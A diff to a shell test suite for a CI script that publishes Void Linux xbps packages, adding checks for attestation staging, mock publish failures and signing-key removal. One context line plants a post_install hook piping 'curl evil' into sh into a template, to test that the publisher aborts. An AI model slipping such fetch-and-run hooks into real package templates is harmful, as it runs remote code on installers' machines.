@@ -18,6 +18,10 @@ tmpl_a() { tmpl_p a "$1" "$2"; }
 # fresh repo under test (+ bare origin), stub voidlab, gh shim
 fresh() {
 	rm -rf "$T/work" "$T/origin.git" "$T/out" "$T/pulled"
+	export RUNNER_TEMP="$T/runner" GITHUB_OUTPUT="$T/github-output"
+	unset MOCK_PUBLISH_FAIL MOCK_NO_DIST MOCK_PUBLISH_REWRITE
+	rm -rf "$RUNNER_TEMP"; mkdir -p "$RUNNER_TEMP"
+	: > "$GITHUB_OUTPUT"
 	git init -q --bare "$T/origin.git"
 	mkdir -p "$T/work/tools"; cd "$T/work"; git init -q
 	cp "$HERE/../tools/ci-publish.sh" "$HERE/../tools/ci-lib.sh" tools/ 2>/dev/null || true
@@ -35,7 +39,15 @@ cat > "$T/vl" <<STUB
 echo "\$*" >> "$T/calls.log"
 case \$1 in
 pull) mkdir -p repo; [ -d "$T/pulled" ] && cp "$T/pulled"/*.xbps repo/ || true ;;
-publish) echo "publish key=\$(stat -c %a "\$VOIDLAB_KEY") first=\$(head -n1 "\$VOIDLAB_KEY") repo=\$(cd repo && ls *.xbps | tr '\n' ' ')" >> "$T/calls.log" ;;
+publish)
+  [ -z "\${MOCK_PUBLISH_FAIL:-}" ] || exit 1
+  echo "publish key=\$(stat -c %a "\$VOIDLAB_KEY") first=\$(head -n1 "\$VOIDLAB_KEY") repo=\$(cd repo && ls *.xbps | tr '\n' ' ')" >> "$T/calls.log"
+  if [ -z "\${MOCK_NO_DIST:-}" ]; then
+    mkdir -p dist; cp repo/*.xbps dist/
+    if [ -n "\${MOCK_PUBLISH_REWRITE:-}" ]; then
+      for f in dist/*.xbps; do printf 'published bytes' >> "\$f"; done
+    fi
+  fi ;;
 esac
 exit 0
 STUB
@@ -73,6 +85,9 @@ rejected() { # <label> <pkg> <expected message>: that template is kept out and r
 	assert_eq   "$1: none of its packages published" "$(grep '^publish' "$T/calls.log" | grep -c " $2-[0-9]\| $2-devel-" || true)" "0"
 	assert_grep "$1: the rest is still published" 'repo=.*c-1.0_1.noarch.xbps' "$T/calls.log"
 	assert_no   "$1: the key is removed" "$T/key.pem"
+	assert_grep "$1: accepted packages still request attestation" '^attest=true$' "$GITHUB_OUTPUT"
+	assert_file "$1: accepted package is staged" "$RUNNER_TEMP/voidlab-attest/c-1.0_1.noarch.xbps"
+	assert_no "$1: rejected package is not staged" "$RUNNER_TEMP/voidlab-attest/$2-1.1_1.noarch.xbps"
 }
 good_a() { # a valid bump of a to 1.1 with a subpackage and an unpublished c
 	printf 'bump\ta\t1.1_1\nunpublished\tc\t1.0_1\n' > "$T/out/passed.tsv"
@@ -113,6 +128,37 @@ assert_grep "publish saw the new packages and the subpackage" 'repo=a-1.1_1.noar
 assert_eq   "the packages are indexed"          "$(XBPS_ARCH=x86_64 xbps-query -i -R --repository="$T/work/repo" -p pkgver a-devel)" "a-devel-1.1_1"
 assert_no   "key file removed afterwards"       "$T/key.pem"
 assert_eq   "the key never existed while gh ran" "$(grep -c 'key=present' "$T/gh.log" || true)" "0"
+assert_grep "successful publication requests attestation" '^attest=true$' "$GITHUB_OUTPUT"
+assert_eq "only the accepted packages are staged" "$(find "$RUNNER_TEMP/voidlab-attest" -type f | wc -l)" "3"
+
+# Provenance follows the published distribution, with no stale or skipped packages.
+fresh; good_a
+mkdir -p "$RUNNER_TEMP/voidlab-attest"; touch "$RUNNER_TEMP/voidlab-attest/stale.xbps"
+export MOCK_PUBLISH_REWRITE=1
+out=$(run) && rc=0 || rc=$?
+assert_eq "published distribution staging succeeds" "$rc" "0"
+if cmp -s "$T/work/dist/a-1.1_1.noarch.xbps" "$RUNNER_TEMP/voidlab-attest/a-1.1_1.noarch.xbps"; then
+	ok "attestation uses exact published bytes"
+else fail "attestation uses exact published bytes"; fi
+assert_no "old attestation files are removed" "$RUNNER_TEMP/voidlab-attest/stale.xbps"
+
+fresh; good_a; export MOCK_NO_DIST=1
+out=$(run) && rc=0 || rc=$?
+assert_eq "missing published file fails staging" "$rc" "1"
+assert_grep "missing file reports staging failure" 'cannot stage published package' <(echo "$out")
+assert_eq "failed staging never requests attestation" "$(cat "$GITHUB_OUTPUT")" "attest=false"
+assert_no "staging failure still removes the signing key" "$T/key.pem"
+
+fresh; good_a; export MOCK_PUBLISH_FAIL=1
+out=$(run) && rc=0 || rc=$?
+assert_eq "failed publication exits 1" "$rc" "1"
+assert_eq "failed publication never requests attestation" "$(cat "$GITHUB_OUTPUT")" "attest=false"
+assert_no "failed publication stages nothing" "$RUNNER_TEMP/voidlab-attest"
+
+fresh; good_a
+out=$(cd "$T/work" && env -u RUNNER_TEMP CI_AUTO_UPDATE_FORCE=1 BUILD_OUT="$T/out" bash tools/ci-publish.sh 2>&1) && rc=0 || rc=$?
+assert_eq "missing runner temp is rejected before publication" "$rc" "1"
+assert_eq "missing runner temp never publishes" "$(grep -c '^publish' "$T/calls.log" || true)" "0"
 
 # 2. abort on anything unexpected in the artifact
 fresh; good_a; echo 'post_install() { curl evil | sh; }' >> "$T/out/templates/a/template"
@@ -397,5 +443,6 @@ assert_eq   "nothing passed exits 0"            "$rc" "0"
 assert_grep "nothing to publish"                'nothing to publish' <(echo "$out")
 assert_eq   "no publish"                        "$(grep -c '^publish' "$T/calls.log" || true)" "0"
 assert_no   "no key file"                       "$T/key.pem"
+assert_eq   "no-op does not request an attestation" "$(cat "$GITHUB_OUTPUT")" "attest=false"
 assert_grep "the failure is still reported"     'issue create --title auto-update failed: b 2.0' "$T/gh.log"
 finish
